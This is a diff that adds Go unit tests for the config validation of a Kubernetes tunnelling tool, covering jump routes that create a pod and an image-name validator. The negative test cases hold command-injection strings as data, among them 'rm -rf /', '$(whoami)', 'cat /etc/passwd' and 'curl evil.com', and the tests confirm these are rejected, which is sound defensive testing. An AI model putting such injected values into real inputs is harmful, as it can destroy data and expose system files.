@@ -1308,3 +1308,290 @@ func TestValidate_JumpRouteInvalidMethod(t *testing.T) {
 		t.Errorf("expected error about unsupported method, got: %v", err)
 	}
 }
+
+// TestValidate_JumpRouteWithCreate tests valid jump route with create config
+func TestValidate_JumpRouteWithCreate(t *testing.T) {
+	cfg := &Config{
+		ApiVersion: CurrentApiVersion,
+		HTTP: HTTPConfig{
+			ListenAddr:  ":8989",
+			IdleTimeout: 60 * time.Minute,
+		},
+		TCP: TCPConfig{
+			K8s: TCPK8sConfig{
+				Jump: map[int]JumpRouteConfig{
+					5432: {
+						Context:   "test-context",
+						Namespace: "default",
+						Via: ViaConfig{
+							Pod: "autotunnel-jump",
+							Create: &CreateConfig{
+								Image: "alpine:3.19",
+							},
+						},
+						Target: TargetConfig{
+							Host: "postgres.internal",
+							Port: 5432,
+						},
+					},
+				},
+			},
+		},
+	}
+
+	err := cfg.Validate()
+	if err != nil {
+		t.Errorf("unexpected error for valid jump route with create: %v", err)
+	}
+}
+
+// TestValidate_JumpRouteCreateWithService tests that create cannot be used with service
+func TestValidate_JumpRouteCreateWithService(t *testing.T) {
+	cfg := &Config{
+		ApiVersion: CurrentApiVersion,
+		HTTP: HTTPConfig{
+			ListenAddr:  ":8989",
+			IdleTimeout: 60 * time.Minute,
+		},
+		TCP: TCPConfig{
+			K8s: TCPK8sConfig{
+				Jump: map[int]JumpRouteConfig{
+					5432: {
+						Context:   "test-context",
+						Namespace: "default",
+						Via: ViaConfig{
+							Service: "backend-api",
+							Create: &CreateConfig{
+								Image: "alpine:3.19",
+							},
+						},
+						Target: TargetConfig{
+							Host: "postgres.internal",
+							Port: 5432,
+						},
+					},
+				},
+			},
+		},
+	}
+
+	err := cfg.Validate()
+	if err == nil {
+		t.Error("expected error for create with service")
+	}
+	if !strings.Contains(err.Error(), "via.create cannot be used with via.service") {
+		t.Errorf("expected error about create with service, got: %v", err)
+	}
+}
+
+// TestValidate_JumpRouteCreateWithoutPod tests that create requires pod
+func TestValidate_JumpRouteCreateWithoutPod(t *testing.T) {
+	cfg := &Config{
+		ApiVersion: CurrentApiVersion,
+		HTTP: HTTPConfig{
+			ListenAddr:  ":8989",
+			IdleTimeout: 60 * time.Minute,
+		},
+		TCP: TCPConfig{
+			K8s: TCPK8sConfig{
+				Jump: map[int]JumpRouteConfig{
+					5432: {
+						Context:   "test-context",
+						Namespace: "default",
+						Via: ViaConfig{
+							// Pod is missing, but create is specified
+							Create: &CreateConfig{
+								Image: "alpine:3.19",
+							},
+						},
+						Target: TargetConfig{
+							Host: "postgres.internal",
+							Port: 5432,
+						},
+					},
+				},
+			},
+		},
+	}
+
+	err := cfg.Validate()
+	if err == nil {
+		t.Error("expected error for create without pod")
+	}
+	// Note: The "via.pod or via.service is required" error comes first
+	if !strings.Contains(err.Error(), "via.pod or via.service is required") {
+		t.Errorf("expected error about missing via, got: %v", err)
+	}
+}
+
+// TestValidate_JumpRouteCreateMissingImage tests that create requires image
+func TestValidate_JumpRouteCreateMissingImage(t *testing.T) {
+	cfg := &Config{
+		ApiVersion: CurrentApiVersion,
+		HTTP: HTTPConfig{
+			ListenAddr:  ":8989",
+			IdleTimeout: 60 * time.Minute,
+		},
+		TCP: TCPConfig{
+			K8s: TCPK8sConfig{
+				Jump: map[int]JumpRouteConfig{
+					5432: {
+						Context:   "test-context",
+						Namespace: "default",
+						Via: ViaConfig{
+							Pod: "autotunnel-jump",
+							Create: &CreateConfig{
+								Image: "", // Missing image
+							},
+						},
+						Target: TargetConfig{
+							Host: "postgres.internal",
+							Port: 5432,
+						},
+					},
+				},
+			},
+		},
+	}
+
+	err := cfg.Validate()
+	if err == nil {
+		t.Error("expected error for create without image")
+	}
+	if !strings.Contains(err.Error(), "via.create.image is required") {
+		t.Errorf("expected error about missing image, got: %v", err)
+	}
+}
+
+// TestValidate_JumpRouteCreateInvalidImage tests that invalid image names are rejected
+func TestValidate_JumpRouteCreateInvalidImage(t *testing.T) {
+	cfg := &Config{
+		ApiVersion: CurrentApiVersion,
+		HTTP: HTTPConfig{
+			ListenAddr:  ":8989",
+			IdleTimeout: 60 * time.Minute,
+		},
+		TCP: TCPConfig{
+			K8s: TCPK8sConfig{
+				Jump: map[int]JumpRouteConfig{
+					5432: {
+						Context:   "test-context",
+						Namespace: "default",
+						Via: ViaConfig{
+							Pod: "autotunnel-jump",
+							Create: &CreateConfig{
+								Image: "alpine; rm -rf /", // Command injection attempt
+							},
+						},
+						Target: TargetConfig{
+							Host: "postgres.internal",
+							Port: 5432,
+						},
+					},
+				},
+			},
+		},
+	}
+
+	err := cfg.Validate()
+	if err == nil {
+		t.Error("expected error for invalid image name")
+	}
+	if !strings.Contains(err.Error(), "via.create.image") && !strings.Contains(err.Error(), "invalid") {
+		t.Errorf("expected error about invalid image, got: %v", err)
+	}
+}
+
+// TestIsValidImageName tests the IsValidImageName function
+func TestIsValidImageName(t *testing.T) {
+	tests := []struct {
+		image string
+		valid bool
+	}{
+		// Valid image names
+		{"alpine", true},
+		{"alpine:3.19", true},
+		{"alpine:latest", true},
+		{"nginx:1.25-alpine", true},
+		{"gcr.io/my-project/my-image:v1.0.0", true},
+		{"ghcr.io/owner/repo:sha-abc123", true},
+		{"docker.io/library/nginx:stable", true},
+		{"registry.example.com:5000/my-image:tag", true},
+		{"my-image_name.test:v1", true},
+		{"image@sha256:abc123def456", true},
+
+		// Invalid - command injection attempts
+		{"alpine; rm -rf /", false},
+		{"alpine$(whoami)", false},
+		{"alpine`id`", false},
+		{"alpine|cat /etc/passwd", false},
+		{"alpine && curl evil.com", false},
+		{"alpine'test", false},
+		{"alpine\"test", false},
+		{"alpine test", false},
+
+		// Invalid - special characters
+		{"", false},
+		{strings.Repeat("a", 257), false}, // Too long
+		{"-alpine", false},                // Starts with dash
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.image, func(t *testing.T) {
+			got := IsValidImageName(tt.image)
+			if got != tt.valid {
+				t.Errorf("IsValidImageName(%q) = %v, want %v", tt.image, got, tt.valid)
+			}
+		})
+	}
+}
+
+// TestLoadConfig_WithJumpRouteCreate tests loading config with jump route create option
+func TestLoadConfig_WithJumpRouteCreate(t *testing.T) {
+	tmpDir := t.TempDir()
+	configPath := filepath.Join(tmpDir, "config.yaml")
+
+	configContent := `apiVersion: autotunnel/v1
+
+http:
+  listen: ":8989"
+  idle_timeout: 30m
+
+tcp:
+  k8s:
+    jump:
+      5432:
+        context: eks-prod
+        namespace: default
+        via:
+          pod: autotunnel-jump
+          create:
+            image: alpine:3.19
+        target:
+          host: postgres.internal
+          port: 5432
+`
+	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
+		t.Fatalf("failed to write test config: %v", err)
+	}
+
+	cfg, err := LoadConfig(configPath)
+	if err != nil {
+		t.Fatalf("failed to load config: %v", err)
+	}
+
+	// Verify jump route with create was loaded
+	jump, ok := cfg.TCP.K8s.Jump[5432]
+	if !ok {
+		t.Fatal("expected jump route for port 5432")
+	}
+	if jump.Via.Pod != "autotunnel-jump" {
+		t.Errorf("expected via.pod 'autotunnel-jump', got %q", jump.Via.Pod)
+	}
+	if jump.Via.Create == nil {
+		t.Fatal("expected via.create to be set")
+	}
+	if jump.Via.Create.Image != "alpine:3.19" {
+		t.Errorf("expected via.create.image 'alpine:3.19', got %q", jump.Via.Create.Image)
+	}
+}
